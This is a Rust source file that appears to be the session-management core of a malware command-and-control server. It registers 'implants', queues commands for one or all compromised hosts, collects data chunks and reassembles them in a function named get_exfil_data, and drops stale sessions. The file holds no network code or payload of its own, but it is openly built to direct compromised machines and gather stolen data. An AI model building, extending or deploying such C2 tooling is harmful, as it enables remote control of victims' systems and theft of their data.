use std::collections::HashMap;
use std::time::{Duration, SystemTime};

const SESSION_TIMEOUT_SECS: u64 = 300; // 5 minutes

pub struct ImplantSession {
    pub id: String,
    pub command_queue: Vec<String>,
    pub data_chunks: HashMap<u32, String>,
    pub last_seen: SystemTime,
}

pub struct C2State {
    pub sessions: HashMap<String, ImplantSession>,
}

impl C2State {
    pub fn new() -> Self {
        C2State {
            sessions: HashMap::new(),
        }
    }

    pub fn get_or_create_session(&mut self, implant_id: &str) -> &mut ImplantSession {
        let is_new = !self.sessions.contains_key(implant_id);
        let session = self
            .sessions
            .entry(implant_id.to_string())
            .or_insert(ImplantSession {
                id: implant_id.to_string(),
                command_queue: Vec::new(),
                data_chunks: HashMap::new(),
                last_seen: SystemTime::now(),
            });

        if is_new {
            println!("\n[!] NEW IMPLANT REGISTERED: {}", implant_id);
            println!("{:=<70}", "");
        }

        session
    }

    pub fn add_command(&mut self, implant_id: &str, command: &String) {
        let session = self.get_or_create_session(implant_id);
        session.command_queue.push(command.to_string());
        println!("[C2] Added command for {}: {}", implant_id, command);
    }

    /// If there are active sessions, queue commands to every active implant
    pub fn add_global_command(&mut self, command: &String) {
        if self.sessions.is_empty() {
            println!("No active sessions");
            return;
        }

        for (id, session) in self.sessions.iter_mut() {
            session.command_queue.push(command.to_string());
            println!("[+] Added global command: {} \n to {}: ", command, id);
        }
    }

    pub fn get_next_command(&mut self, implant_id: &str) -> Option<String> {
        if let Some(session) = self.sessions.get_mut(implant_id) {
            session.last_seen = SystemTime::now();
            if !session.command_queue.is_empty() {
                return Some(session.command_queue.remove(0));
            }
        }
        None
    }

    pub fn has_commands(&self, implant_id: &str) -> bool {
        self.sessions
            .get(implant_id)
            .map(|s| !s.command_queue.is_empty())
            .unwrap_or(false)
    }

    pub fn store_chunk(&mut self, implant_id: &str, seq: u32, data: String) {
        let session = self.get_or_create_session(implant_id);
        session.data_chunks.insert(seq, data);
        session.last_seen = SystemTime::now();
        println!(
            "[C2] Stored chunk {} for {} (total chunks: {})",
            seq,
            implant_id,
            session.data_chunks.len()
        );
    }

    /// If there are active sessions, print the sessions IDs, command queue, and elapsed connection time
    pub fn list_sessions(&self) {
        if self.sessions.is_empty() {
            println!("No active sessions");
            return;
        }

        println!("\nActive Sessions:");
        println!("{:-<70}", "");
        for (id, session) in &self.sessions {
            let elapsed = session
                .last_seen
                .elapsed()
                .map(|d| format!("{}s ago", d.as_secs()))
                .unwrap_or_else(|_| "unknown".to_string());
            println!(
                "  {} | Commands queued: {} | Last seen: {}",
                id,
                session.command_queue.len(),
                elapsed
            );
        }
        println!("{:-<70}", "");
    }

    pub fn get_exfil_data(&self, implant_id: &str) -> Option<String> {
        self.sessions.get(implant_id).map(|session| {
            let mut chunks: Vec<_> = session.data_chunks.iter().collect();
            chunks.sort_by_key(|(seq, _)| *seq);
            chunks
                .iter()
                .map(|(_, data)| data.as_str())
                .collect::<Vec<_>>()
                .join("")
        })
    }

    pub fn cleanup_stale_sessions(&mut self) -> usize {
        let timeout = Duration::from_secs(SESSION_TIMEOUT_SECS);
        let now = SystemTime::now();

        let stale: Vec<String> = self
            .sessions
            .iter()
            .filter(|(_, session)| {
                now.duration_since(session.last_seen)
                    .map(|d| d > timeout)
                    .unwrap_or(false)
            })
            .map(|(id, _)| id.clone())
            .collect();

        let count = stale.len();
        for id in stale {
            println!(
                "[!] Removing stale session: {} (timeout: {}s)",
                id, SESSION_TIMEOUT_SECS
            );
            self.sessions.remove(&id);
        }

        count
    }

    pub fn is_session_alive(&self, implant_id: &str) -> bool {
        if let Some(session) = self.sessions.get(implant_id) {
            let timeout = Duration::from_secs(SESSION_TIMEOUT_SECS);
            SystemTime::now()
                .duration_since(session.last_seen)
                .map(|d| d <= timeout)
                .unwrap_or(false)
        } else {
            false
        }
    }
}
